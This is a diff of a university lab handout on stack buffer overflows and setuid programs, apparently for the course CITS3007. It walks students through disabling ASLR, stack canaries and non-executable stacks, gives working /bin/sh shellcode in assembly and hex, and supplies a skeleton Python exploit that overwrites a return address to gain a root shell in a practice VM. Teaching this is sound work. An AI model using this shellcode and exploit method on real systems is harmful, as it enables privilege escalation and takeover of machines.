@@ -1,654 +1,1141 @@
 ---
 title: |
-  CITS3007 lab 5 (week 7)&nbsp;--&nbsp;Static analysis
+  CITS3007 lab 4 (week 6)&nbsp;--&nbsp;Buffer overflows
 ---
 
-The aim of this lab is to familiarize you with some of the static
-analysis tools available for analysing C and C++ code, and to
-try a dynamic analysis/fuzzing tool (AFL).
+It's recommended you complete this lab in pairs, if possible, and
+discuss your results with your partner.
+
+The objective of this lab is to gain insight into
+
+a. buffer overflow vulnerabilities, and
+b. setuid programs
+
+and see how they can be exploited.
+You will be given a `setuid` program with a buffer overflow vulnerability,
+and your task is to develop a scheme to exploit the vulnerability and
+gain root privileges.
+
+<div style="border: solid 2pt orange; background-color: hsl(22.35, 100%, 85%, 1); padding: 1em;">
+
+<center>**Note -- Virtual Machine requirements**</center>
+
+Completing this lab requires you to have root access to the Linux kernel
+of the VM (or other machine) you're running on. Otherwise, the command
+
+```
+sudo sysctl -w kernel.randomize_va_space=0
+```
+
+(in section 1.1, [Turning off countermeasures](#countermeasures))
+will fail. Furthermore, the [shellcode](#shellcode) used in this lab
+contains machine-code instructions specific to the x86-64 architecture.
+
+Consequently, you will not be able to complete the lab using
+any of the following methods:
+
+***gitpod***
+
+:   The [GitPod][gitpod] environment does ***not*** give you root
+    access to the kernel;
+    while using GitPod, you are running within a
+    security-restricted [Docker container][docker] *within* a VM,
+    and will be unable to change the way the kernel is running.
+
+***a non–x86-64 virtual machine***
+
+:   Architectures other than x86-64 will not recognize the machine code
+    intructions contained in the shellcode. If you normally
+    use a VM with some other architecture (for instance, ARM64), you
+    will have to switch to one that uses an x86-64 architecture.
+
+[gitpod]: https://gitpod.io/
+[docker]: https://docs.docker.com/get-started/overview/
+
+The only supported way of completing this lab is by using Vagrant (as outlined
+in Lab 1) to run the standard CITS3007 development environment image
+from VirtualBox. Within that VM, you *do* have
+root access to the kernel, and all commands should complete successfully.
+
+Lab facilitators will not be able to support you if you try to complete
+the lab in some other environment and encounter any issues.
+
+If you are unable to run Vagrant and VirtualBox on your laptop, it's
+recommended you pair up with a student who is able to, and complete the
+lab working with them. If you're unable to do that, please let your lab
+facilitator know, and we'll see if we can provide an alternative.
+
+</div>
 
 ## 1. Setup
 
-In a CITS3007 development environment VM, download the source code for
-the `dnstracer` program which we'll be analysing and extract it:
+### 1.1. Turning off countermeasures { #countermeasures }
+
+Modern operating systems implement several security mechanisms to make
+buffer overflow attacks more difficult. To simplify our attacks, we need to disable them first.
+
+
+
+**Address Space Randomization**
+
+:   Ubuntu and several other Linux-based systems use address space
+    randomization to randomize the starting address of heap and stack. This
+    makes guessing the exact addresses difficult. This feature can be
+    disabled by running the following command in the CITS3007
+    development environment:
+
+    ```
+    $ sudo sysctl -w kernel.randomize_va_space=0
+    ```
+
+    <div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em; margin-bottom: 1em">
+
+    **The `sysctl` command**
+
+    This information isn't essential to the lab, but may be helpful in
+    understanding what's going on here.
+
+    The [`sysctl`](https://linux.die.net/man/8/sysctl) command
+    (documented at `man 8 sysctl`) alters the parameters of a running
+    Linux kernel. (The `sysctl` command should not be confused with the
+    annoyingly similarly named
+    [`systemctl`](https://man7.org/linux/man-pages/man1/systemctl.1.html)
+    command,
+    which has to do with starting and stopping daemon programs
+    on a system.)
+
+    The current value of the `randomize_va_space` ("randomize virtual
+    address space") kernel parameter can be displayed by running the
+    command:
+
+    ```
+    $ cat /proc/sys/kernel/randomize_va_space
+    ```
+
+    The result is a number, 0, 1 or 2, with the following meanings:
+
+    - 0 -- No randomization. Everything is static.
+    - 1 -- Conservative randomization. Shared libraries, stack, `mmap()`,
+      VDSO and heap are randomized.
+    - 2 -- Full randomization. In addition to elements listed in the
+      previous point, memory managed through `brk()` is also randomized.
+
+    (The [`brk()`](https://man7.org/linux/man-pages/man2/sbrk.2.html)
+    system call, documented at `man 2 brk`, [adjusts the
+    size of the heap](https://stackoverflow.com/a/31082353/6818792); it's one of the
+    system calls typically used by `malloc` to allocate memory on the
+    heap.)
+
+    We use the `sysctl` command to set this parameter to 0.
+
+    </div>
+
+
+**Configuring `/bin/sh`**
+
+:   In recent versions of Ubuntu OS, `/bin/sh` is a symbolic link pointing to the
+    `/bin/dash` shell: run `ls -al /bin/sh` to see this.
+
+    The dash program (as well as bash) implements a countermeasure that
+    prevents it from being executed in a setuid process. If the shell
+    detects that the effective user ID differs from the actual user ID
+    (see the previous lab),
+    it will immediately change the effective user ID back to the real user ID,
+    essentially dropping the privilege.
+
+    Since our victim program is a `setuid` program, and our attack
+    relies on running `/bin/sh`, the
+    countermeasure in `/bin/dash` makes our attack more difficult.
+    Therefore, we will link `/bin/sh` to
+    `zsh` instead, a shell which lacks such
+    protection (though with a little bit more effort, the countermeasure in
+    `/bin/dash` can be easily defeated). Inside the development
+    environment VM, install the `zsh` package
+    with the command
+    `sudo apt-get update && sudo apt-get install -y zsh`,
+    then run the following command to link `/bin/sh` to `zsh`:
+
+    ```
+    $ sudo ln -sf /bin/zsh /bin/sh
+    ```
+
+    You can confirm that you've done this correctly by running the
+    command:
+
+    ```
+    $ sh --version
+    ```
+
+    If all is working as expected, it should display:
+
+    ```
+    zsh 5.8 (x86_64-ubuntu-linux-gnu)
+    ```
+
+
+**Non-executable stack**
+
+:   When the program runs, the memory segment containing the stack can
+    be marked non-executable. This feature can be turned off during
+    compilation, by passing the option "`-z execstack`" to `gcc`.
+    This option is passed onto the linker, `ld`, and marks the
+    output binary as requiring an *executable* stack.
+
+    This option is documented in `man ld`, and we will discuss it
+    further when compiling our programs.
+
+
+**Stack canaries**
+
+:   The `gcc` compiler can include code in a compiled program
+    which inserts [stack canaries][canaries] in the stack frames
+    of a running program, and before returning from a function,
+    checks that the canary is unaltered.
+
+    A RedHat article on compiler [stack protection flags][gcc-stack-protector]
+    outlines the flags which enable stack canaries in `gcc`; we
+    will use the `-fno-stack-protector` flag to ensure they're disabled.
+    (Further documentation on these options is available in the
+    [`gcc` manual][gcc-stack-man].) We discuss this option further
+    when compiling our programs.
+
+[canaries]: https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/
+[gcc-stack-protector]: https://developers.redhat.com/articles/2022/06/02/use-compiler-flags-stack-protection-gcc-and-clang#stack_canary
+[gcc-stack-man]: https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc/Instrumentation-Options.html#Instrumentation-Options
+
+
+
+## 2. Shellcode
+
+[*Shellcode*][shellcode] is a small portion of code that launches a
+shell, and is widely used in code injection attacks.
+The aim is to inject code into the running process that will allow us
+to exploit the system.
+In the buffer overflow attack we launch in this lab, we'll write that
+code -- which is just a sequence of bytes -- into a location on the
+stack, and try to convince the target program to execute it.
+
+[shellcode]: https://en.wikipedia.org/wiki/Shellcode
+
+
+Represented in C, a piece of shellcode might look like the following:
+
+```{.c .numberLines}
+// shellcode.c
+#include <stdio.h>
+
+int main() {
+  char *name[2];
+  name[0] = "/bin/sh";
+  name[1] = NULL;
+  execve(name[0], name, NULL);
+}
+```
+
+Read about the Linux `execve` system call by typing [`man execve`][man-execve]; it
+allows us to execute a program from C code. The `name` array is
+effectively a list of pointers-to-`char`, with a `NULL` pointer used to
+mark the end of the list.
+
+[man-execve]: https://man7.org/linux/man-pages/man2/execve.2.html
+
+However, we can't straightforwardly use `gcc` to obtain our shellcode.
+Recall that shellcode is a *small* sequence of bytes that we want to
+inject into a target process.
+Try saving the above code as `shellcode.c`, and
+compile it with `make shellcode.o shellcode`. Examine the size of the
+compiled program with
 
 ```
-$ wget https://www.mavetju.org/download/dnstracer-1.9.tar.gz
-$ tar xf dnstracer-1.9.tar.gz
-$ cd dnstracer-1.9
+$ du -sk shellcode
 ```
 
-We'll also use several `vim` plugins, including ALE
-(<https://github.com/dense-analysis/ale>), which runs linters on our
-code:
+and you will see that the compiled binary is about 20 kilobytes -- far
+too big and unwieldy for our purposes. (Once preprocessing is done on
+the C code with `cpp`, and all header files and their definitions
+are included, the resulting code is a lot bigger than the 9 lines above
+would suggest. Read [here][teensy] about one user's attempts to get the
+smallest possible "Hello world" program using `gcc`.)
 
-```
-$ mkdir -p ~/.vim/pack/git-plugins/start
-$ git clone --depth 1 https://github.com/dense-analysis/ale.git ~/.vim/pack/git-plugins/start/ale
-$ git clone --depth 1 https://github.com/preservim/tagbar.git   ~/.vim/pack/git-plugins/start/tagbar
-```
+[teensy]: http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html
 
-Set up a `vim` configuration by running the following (you may need to hit `newline`
-an extra time afterwards):
 
-```
-tee -a ~/.vimrc <<EOF
-set number
-let g:ale_echo_msg_format = '[%linter%] %s [%severity%]'
-let g:ale_c_gcc_options = '-std=c11 -Wall -Wextra -DHAVE_CONFIG_H -I. -Wno-pointer-sign'
-let g:ale_c_clang_options = '-std=c11 -Wall -Wextra -DHAVE_CONFIG_H -I. -Wno-pointer-sign'
-let g:ale_c_clangtidy_checks =  ['-clang-diagnostic-pointer-sign', 'cert-*']
-let g:ale_c_clangtidy_options =  '--extra-arg="-DHAVE_CONFIG_H -I. -Wno-pointer-sign"'
-EOF
+Instead, the easiest way to construct shellcode is to write it in
+[assembly language][assembly].[^assembly] The Intel 32-bit assembly code equivalent for the above C
+code would be something like the following (which you are not required
+to understand, but is presented here for interest):
 
-```
+[^assembly]: Also called [assembly][assembly], assembler language, assembler
+  or symbolic machine code.
 
-## 2. Building and analysis
+[assembly]: https://en.wikipedia.org/wiki/Assembly_language 
 
-### 2.1. Building
 
-Build `dnstracer`:
+``` {.asm .numberLines}
+; Store the command on stack
+xor  eax, eax
+push eax
+push "//sh"
+push "/bin"
+mov  ebx, esp ; ebx --> "/bin//sh": execve()'s 1st argument
 
-```
-$ ./configure
-$ make
-```
+; Construct the argument array argv[]
+push eax ; argv[1] = 0
+push ebx ; argv[0] --> "/bin//sh"
+mov ecx, esp ; ecx --> argv[]: execve()'s 2nd argument
 
-You can read more about the `dnstracer` program at
-<https://www.mavetju.org/unix/general.php>. It is subject to
-a known vulnerability,
-[CVE-2017-9430](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9430).
-`dnstracer` uses the tools [Autoconf and Automake][autoconf] to
-determine the type of system being compiled on, and whether any special
-flags are needed for compilation.
+; For environment variable
+xor edx, edx ; edx = 0: execve()'s 3rd argument
 
-[autoconf]: https://en.wikipedia.org/wiki/Autoconf
-
-The `./configure` script generates two files, a `Makefile` and
-`config.h`, which incorporate information about the system being
-compiled on. However, the content of those two files is only as good as
-the developer makes it -- if they don't enable the warnings and checks
-that they should, then the final executable can easily be buggy.
-The output of the `make` command above should show us the final compilation
-command being run:
-
-```
-gcc -DHAVE_CONFIG_H -I. -I. -I.     -g -O2 -c `test -f 'dnstracer.c' || echo './'`dnstracer.c
+; Invoke execve()
+xor eax, eax ;
+mov al, 0x0b ; execve()'s system call number
+int 0x80
 ```
 
-and a warning about a possible vulnerability (marked with
-`-Wformat-overflow`). However, there are *many* more problems with the
-code than running `make` reveals. If you run `./configure --help`,
-you'll see that we can supply a number of arguments to `./configure`.
-Let's try to increase the amount of checking our compiler does (and
-improve error messages) by switching our compiler to `clang`, and
-enabling more compiler warnings:
+A brief explanation of the code (again, you're not required
+to understand this in detail) is:
+
+
+[^registers]: A small, named memory cell used by the processor.
+  See ["Registers and the stack"](#registers-and-the-stack).
+
+
+- The `"/sh"` and `"/bin"` arguments are pushed onto the stack (lines
+  1--5)
+- We need to pass three arguments to `execve()` via the `ebx`, `ecx` and
+  `edx` *registers*,[^registers] respectively.
+  The majority of the shellcode basically constructs the content for these three arguments.
+- The code in lines 17--19 is where we make the `execve` system call --
+  that is, we request a service from the kernel.
+  The kernel expects us to put a number identifying the system call
+  we're after (in this case, `execve`) into the `a1` register,
+  and then notify the kernel by invoking an "interrupt".
+
+  So, we need to know what the system call number for `execve` is --
+  it is `0x0b`.
+  (A list of all the system calls and
+  their numbers are found in a Linux header called `unistd_32.h`,
+  usually found at `/usr/include/x86_64-linux-gnu/asm/unistd_32.h`.
+  On Ubuntu, this file will only exist if you've installed the package
+  `linux-libc-dev`.)
+
+  We set `al` to `0x0b` (`al` represents the lower 8 bits
+  of the `eax` register),
+  and then execute the instruction "`int 0x80"`.
+
+  The `int` instruction generates a call to an *interrupt handler* --
+  a bit like an exception handler --
+  and the `0x80` in `int 0x80` identifies a specific bit of kernel handler code
+  which exists to handle system calls.
+
+  That handler will look in register `a1` (part of
+  the `eax` register) to find out what system
+  call we want to execute,
+  and in registers `ebx`, `ecx` and `edx` for the arguments
+  to that system call.
+
+
+<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">
+
+**Programming in assembly**
+
+If you're interested in further details on programming in
+x86 assembly, this [guide][x86-asm-guide] from the University of
+Virginia gives more details, such as how the `push` instruction
+works with the hardware-supported call stack.
+
+[x86-asm-guide]: https://www.cs.virginia.edu/~evans/cs216/guides/x86.html
+
+Another useful reference is the [Wikibook](https://en.wikibooks.org) on
+[x86 Assembly](https://en.wikibooks.org/wiki/X86_Assembly).
+
+</div>
+
+We won't do it in this lab, but the assembly code above can be assembled
+using [`nasm`][nasm], an assembler for the x86 CPU architecture.
+`nasm` would compile the above assembly into an object file (called,
+say, `sploit.o`),
+and that resulting object file contains the exact sequence of bytes we
+need
+to insert in order to invoke `/bin/sh`. The following table is an
+extract from a compiled object file produced by `nasm`,[^objdump] and
+shows that just
+26 bytes (hex `0x1a`) are needed -- these 26 bytes
+will have the same effect as the 20KB executable compiled from
+`shellcode.c`.
+The leftmost colum shows offsets in
+hex,
+the second column the exact byte values we want, and the last column
+the corresponding assembly code:
+
+[^objdump]: You can replicate this by saving the assembly code as
+  a file `sploit.s`, and inserting the lines: \
+  \
+  `section .text`  \
+  &nbsp;&nbsp;`global _start` \
+  &nbsp;&nbsp;&nbsp;&nbsp;`_start:` \
+  \
+  at the start. Compile it with the command `nasm -f elf32 sploit.s -o
+  sploit.o`, then issue the command `objdump -d sploit.o` to see the
+  disassembled shellcode.
+
 
 ```
-$ CC=clang CFLAGS="-pedantic -Wall -Wextra" ./configure
-$ make clean all
+off   bytes                       assembly code
+---------------------------------------------------
+   0:    31 c0                    xor    eax,eax
+   2:    50                       push   eax
+   3:    68 2f 2f 73 68           push   0x68732f2f
+   8:    68 2f 62 69 6e           push   0x6e69622f
+   d:    89 e3                    mov    ebx,esp
+   f:    50                       push   eax
+  10:    53                       push   ebx
+  11:    89 e1                    mov    ecx,esp
+  13:    31 d2                    xor    edx,edx
+  15:    31 c0                    xor    eax,eax
+  17:    b0 0b                    mov    al,0xb
+  19:    cd 80                    int    0x80
 ```
 
-If you look through the output, you'll see many warnings that include
+[nasm]: https://www.nasm.us
+
+### 2.1. Invoking the shellcode
+
+Download the file [`bufoverflow-code.zip`][lab-zip] into the VM
+(you can use the command `wget https://cits3007.github.io/labs/bufoverflow-code.zip`)
+and unzip it.
+
+[lab-zip]: https://cits3007.github.io/labs/bufoverflow-code.zip
+
+`cd` into the `shellcode` directory, and take a look at
+`call_shellcode.c` (reproduced below):
+
+```{.C .numberLines}
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+// Binary code for setuid(0)
+// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
+// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"
+
+
+const char shellcode[] =
+#if __x86_64__
+  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
+  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
+  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+#else
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+#endif
+;
+
+int main(int argc, char **argv)
+{
+   char code[500];
+
+   strcpy(code, shellcode);
+   int (*func)() = (int(*)())code;
+
+   func();
+   return 1;
+}
+```
+
+The purpose of this program is to demonstrate that our
+shellcode byte-sequence does indeed invoke the shell
+`/bin/sh`.
+
+The byte sequences are stored in the array `shellcode` --
+observe that the 32-bit version starts with "`\x31\xc0\x50`",
+which is the byte sequence we get from compiling our assembly code.
+
+In line 27, we declare `func`, which is a *pointer to a function*; the address of
+the "function" we're pointing at is in fact the buffer `code`.
+We cast the address of `code` into the type we want
+by putting `(int(*)())` in front of it; that says the type to convert to
+is "pointer to a function which takes no arguments and returns an
+`int`". (Try pasting that fragment of code into <https://cdecl.org>
+and see what it translates the type as.)
+Usually, the bytes sitting in `code` would *not* be
+executable, because they are
+part of the call stack; but in our Makefile we pass the option "`-z
+execstack`" to `gcc`, which says to make the stack memory segment
+executable.
+
+So: when the function pointer `func` is invoked (line 29), the instructions sitting in
+`code` will be executed.
+Discuss with your lab partner what is happening here; ask the
+lab facilitator for an explanation if you're not sure.
+
+The code above includes two copies of the shellcode -- one is 32-bit and
+the other is 64-bit. When we compile the program using the -m32 flag,
+the 32-bit version will be used; without this flag, the 64-bit version
+will be used. Using the provided Makefile, you can compile the code by
+typing `make`.
+Two binaries will be
+created, `a32.out` (32-bit) and `a64.out` (64-bit).
+Run them and describe your observations. As noted above,
+the compilation uses the `execstack` option, which allows code to be executed from the stack;
+without this option, the program will fail. Try deleting the flags "`-z
+execstack`" from the makefile and compile and run the programs again -- what happens?
+
+
+
+
+
+## 3. A vulnerable program
+
+The vulnerable program used in this lab is called `stack.c`, which is in
+the `code` folder from the zip file. This program has
+a buffer overflow vulnerability, and your job is to exploit this
+vulnerability and gain root privileges. The essential parts are shown
+below (some inessential functions have been omitted):
+
+```{.C .numberLines}
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+
+#ifndef BUF_SIZE
+#define BUF_SIZE 100
+#endif
+
+int bof(char *str) {
+    char buffer[BUF_SIZE];
+
+    // The following statement has a buffer overflow problem
+    strcpy(buffer, str);
+
+    return 1;
+}
+
+int main(int argc, char **argv) {
+    char str[517];
+    FILE *badfile;
+
+    badfile = fopen("badfile", "r");
+    if (!badfile) {
+       perror("Opening badfile"); exit(1);
+    }
+
+    int length = fread(str, sizeof(char), 517, badfile);
+    printf("Input size: %d\n", length);
+    bof(str);
+    fprintf(stdout, "==== Returned Properly ====\n");
+    return 1;
+}
+```
+
+The above program has a buffer overflow vulnerability. It first reads an
+input from a file called `badfile`, and then passes this input to another
+buffer in the function `bof()`. The original input can have a maximum
+length of 517 bytes, but the buffer in `bof()` is only `BUF_SIZE` bytes
+long, which is less than 517. Because `strcpy()` does not check
+boundaries, buffer overflow will occur.
+
+Since this program is a
+root-owned `setuid` program, if a normal user is able to exploit this
+vulnerability, the user may be able to get a root shell. Note
+that the program gets its input from a file called
+`badfile`, which is under users' control. Your objective is to
+create the contents for `badfile`, such that when the vulnerable program
+copies the contents into its buffer, a root shell can be spawned.
+
+### 3.1. Compilation
+
+To compile the above vulnerable program, do not forget to turn off the
+stack canaries and the
+non-executable stack protections using the `-fno-stack-protector` and
+"`-z execstack`" options.
+
+After compilation, we need to make the program a root-owned `setuid`
+program. We can achieve this by first changing the ownership of the
+program to root, and then changing the permission to `4755` to enable
+the `setuid` bit:
+
+```
+$ gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c
+$ sudo chown root stack
+$ sudo chmod 4755 stack
+```
+
+It should be noted that changing ownership must be done before turning
+on the `setuid` bit, because ownership change will cause the `setuid` bit to be turned off.
+
+The compilation and setup commands are already included in Makefile, so
+we just need to type `make`
+to execute those commands. The variables L1, ..., L4 are set in Makefile; they will be used during the
+compilation.
+
+<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">
+
+Typing `make` should result in output like the following:
+
+```
+gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -o stack-L1 stack.c
+gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -g -o stack-L1-dbg stack.c
+sudo chown root stack-L1 && sudo chmod 4755 stack-L1
+gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -o stack-L2 stack.c
+gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -g -o stack-L2-dbg stack.c
+sudo chown root stack-L2 && sudo chmod 4755 stack-L2
+gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -o stack-L3 stack.c
+gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -g -o stack-L3-dbg stack.c
+sudo chown root stack-L3 && sudo chmod 4755 stack-L3
+gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -o stack-L4 stack.c
+gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -g -o stack-L4-dbg stack.c
+sudo chown root stack-L4 && sudo chmod 4755 stack-L4
+```
+
+The following executables should get built:
+
+```
+stack-L1    stack-L1-dbg
+stack-L2    stack-L2-dbg
+stack-L3    stack-L3-dbg
+stack-L4    stack-L4-dbg
+```
+
+The level 1 ("L1") programs should be the easiest to exploit, and are the
+ones we use in this lab; and for each level, the ones with debugging
+symbols enabled ("-dbg") should be very straightforward to exploit.
+
+If you are able to successfully exploit the `stack-L1-dbg` and
+`stack-L1` programs, then for a challenge, you might like to try
+exploiting the L2, L3 and L4 programs.
+
+</div>
+
+
+### 3.2. Launching an attack on a 32-bit program
+
+To exploit the buffer-overflow vulnerability in the target program, the
+most important thing to know is the distance between the buffer’s
+starting position and the place where the return-address is stored. We
+will use a debugging method to find it out. Since we have the source
+code of the target program, we can compile it with the debugging flag
+turned on. That will make it more convenient to debug.
+
+We will add the `-g` flag to the `gcc` command, so debugging information
+is added to the binary.
+If you run
+`make`, the debugging version is already created. We will use `gdb` to
+debug `stack-L1-dbg`. We need to
+create a file called `badfile` before running the program.
+
+```
+$ touch badfile # Create an empty badfile
+$ gdb stack-L1-dbg # start gdb
+```
+
+<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">
+
+**ASLR in `gdb`**
+
+When you run a program in `gdb`, ASLR address randomization gets
+temporarily turned off. (If you already disabled ASLR using the
+`systemctl` command, as described under
+"[Turning off countermeasures](#countermeasures)", then obviously
+this won't make any difference. But on systems that *do* have ASLR
+enabled, this explains why the address you see in `gdb` can differ
+from the addresses found in a normally-running program.)
+
+It's not necessary for you to know the details of how this is done;
+but if you're interested, take a look at [`man 2
+personality`][personality]. On Linux, calling
+`personality(ADDR_NO_RANDOMIZE)` changes how the stack and heap will be laid
+out in memory.
+Then, one can call [`fork()`][man-fork] and one of the [`exec`][man-exec] functions
+to launch a new process in which ASLR is disabled.
+
+[personality]: https://man7.org/linux/man-pages/man2/personality.2.html
+[man-fork]: https://man7.org/linux/man-pages/man2/fork.2.html
+[man-exec]: https://man7.org/linux/man-pages/man3/exec.3.html
+
+</div>
+
+
+Within gdb, run the commands:
+
+```
+(gdb) b bof
+(gdb) run
+(gdb) next
+(gdb) print $ebp
+(gdb) print &buffer
+(gdb) quit
+```
+
+This will set a break point at function `bof()` and run the program.
+We stop at the `bof` function and step to the `strcpy` call.
+
+The `ebp` register is used at runtime to point to the "start"
+(high-memory end) of the current stack frame.
+When gdb stops "inside" the `bof()` function, it actually
+stops *before* the `ebp` register is set to point to the
+current stack frame, so if we print out the value of ebp here, we will
+get the *caller's* `ebp` value. We need
+to use `next` to execute a few instructions and stop after the `ebp`
+register is modified to point to the stack
+frame of the `bof()` function.
+
+It should be noted that the frame pointer value obtained from gdb is
+**different** from that during the actual execution (without using gdb).
+This is because gdb has pushed some environment data into the stack
+before running the debugged program. When the program runs directly
+without using gdb, the stack does not have those data, so the actual
+frame pointer value will be larger. You should keep this in mind when
+constructing your payload.
+
+<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">
+
+<center id="registers-and-the-stack">**Registers and the stack**</center>
+
+[register]: https://en.wikipedia.org/wiki/Processor_register
+
+A [*register*][register] is a quickly accessible location available to a CPU. You
+can think of it as being a `size_t` cell of memory hanging directly off
+the CPU. (Often, the CPU will also provide ways of referring to just
+*part* of a register, as well. For instance, there may be a
+name by which you can refer to just the 8 lowest (`char`-sized)
+bits of some register.)
+Instead of having memory *addresses*, like locations in RAM, they have *names* --
+for instance, `eax`, `ebx`, `ecx`, `edx`, and so on.
+As a program executes, data from RAM will often be loaded
+into the processor's registers so it can be operated on.
+
+On 32-bit Intel machines, some of the registers have special purposes.
+
+- The `eip` register: this is the "Extended Instruction Pointer"
+  register (or just "Instruction Pointer") -- it keeps track of what
+  instruction should be executed next.
+
+  When a function is called -- and a new stack frame gets pushed
+  onto the call stack -- the value of the `eip` register needs to be
+  *saved* somewhere in the stack frame, so that when the current
+  function returns, we know what instruction to execute afterwards.
+
+- The `ebp` register: this is used to hold the "base pointer"
+  for the current stack frame. As the stack frame is being set up,
+  `ebp` will be used to store a "start" or "base" point for the stack
+  frame, and the location of variables will be calculated relative to
+  the value of `ebp`.
+
+  On `gcc`, it's possible to use the function
+  `__builtin_frame_address()` to
+  get the value of the `ebp` register (see <https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html>).
+
+- The `esp` register: the "current stack frame" pointer. This
+  points to the spot in the current stack frame where
+  new local variables should be inserted.
+  As a stack frame is being set up, this starts off being equal
+  to the `ebp` register. As memory is allocated for local variables,
+  the `esp` register will get decremented.
+
+`<div style="display: flex; justify-content: center;">`{=html}
+![](images/x86-registers.png "x86 registers"){ width=60% }
+`</div>`{=html}
+`<div style="display: flex; justify-content: center;">`{=html}
+x86 registers
+`</div>`{=html}
+
+
+(Diagram of x86 registers from University of Virginia cs216 [*x86
+Assembly Guide*](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html) by
+David Evans.)
+
+</div>
+
+
+To exploit the buffer
+overflow vulnerability in the target program, we need to prepare a payload, and save
+it inside `badfile`. We will use a Python program to do that. We provide a skeleton program called
+`exploit.py`, which is included in the lab zip file.
+The code is incomplete, and you will need to replace
+some of the essential values in the code (marked with an
+`XXX`):
+
+```{.python .numberLines}
+#!/usr/bin/python3
+import sys
+
+# XXX - replace the content with the actual shellcode
+shellcode= (
+  "\x90\x90\x90\x90"
+  "\x90\x90\x90\x90"
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517))
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 0               # XXX - change this number
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value
+# and put it somewhere in the payload
+ret    = 0x00           # XXX - change this number
+offset = 0              # XXX - change this number
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+You will need to change the `exploit.py` code to:
+
+- Write the correct sequence of shellcode bytes, at line 5.
+  (Currently, the variable `shellcode` just contains do-nothing, "no-op"
+  instructions -- these are a bit like writing semicolons without
+  a statement in C, or `pass` statements in Python.)
+- Alter the `start` variable at line 15. This specifies at exactly
+  what offset in `badfile` the shellcode bytes are inserted.
+- Alter the `ret` variable at line 20 and the `offset` variable
+  at line 21. `offset` specifies a place in `badcode` where
+  we want to insert an "address to return to", and `ret` is that
+  address.
+
+Running `exploit.py`
+will generate a file `badfile`.
+Then run the vulnerable program `stack`.
+
+If your exploit is implemented correctly, you should be able to get a root shell:
+
+```
+$ ./exploit.py # create the badfile
+$ ./stack-L1   # launch the attack by running the vulnerable program
+# <---- Bingo! You’ve got a root shell!
+```
+
+Try running the command `id` to confirm you are root.
+
+<div style="border: solid 2pt blue; background-color: hsla(241, 100%,50%, 0.1); padding: 1em; border-radius: 5pt; margin-top: 1em;">
+
+<center>**Easier and harder exercises**</center>
+
+The following section gives some suggestions on how to identify the
+values that should go in the `XXX` parts of `exploit.py`.
+
+You may want to work through that section, and then try a fairly
+easy exercise -- can you craft a `badfile` which will give you
+root access when `./stack-L1-dbg` is run?
+
+Then try customizing the values in `exploit.py` so that you can
+exploit `./stack-L1`. It will require slightly different values to
+`./stack-L1-dbg`. How can you find them?
+
+Your lab facilitator may have some hints.
+
+
+</div>
+
+
+### 3.3. Hints on inserting your shellcode
+
+It can be helpful to try and orient yourself while using `gdb`, and
+work out where different parts of the stack are. In this section, we
+show some commands you can run to find their locations.
+
+While you have the `stack-L1-dbg` program stopped at a breakpoint in
+`gdb`, open another terminal session and `ssh` into the VM so you can
+run `ps -af | grep stack-L1-dbg`.
+
+You should see something like the following:
+
+```
+$ ps -af | grep stack-L1-dbg
+vagrant     1355    1340  0 02:43 pts/1    00:00:00 gdb ./stack-L1-dbg
+vagrant     1357    1355  0 02:43 pts/1    00:00:00 /home/vagrant/lab04-code/code/stack-L1-dbg
+vagrant     1362    1246  0 02:44 pts/0    00:00:00 grep --color=auto stack-L1-dbg
+```
+
+Here, the second line shows the (currently stopped) `stack-L1-dbg`
+process; the second column is the *process ID*. If you run `<code>cat
+/proc/<em>process_id</em>/maps</code>`{=html} (replacing *process_id* with the
+process ID of the `stack-L1-dbg` process), you should get output like
 the following:
 
 ```
-passing 'unsigned char *' to parameter of type 'char *' converts between pointers to integer types with different sign [-Wpointer-sign]
+56555000-56558000 r-xp 00000000 fc:03 393228                             /home/vagrant/lab04-code/code/stack-L1-dbg
+56558000-56559000 r-xp 00002000 fc:03 393228                             /home/vagrant/lab04-code/code/stack-L1-dbg
+56559000-5655a000 rwxp 00003000 fc:03 393228                             /home/vagrant/lab04-code/code/stack-L1-dbg
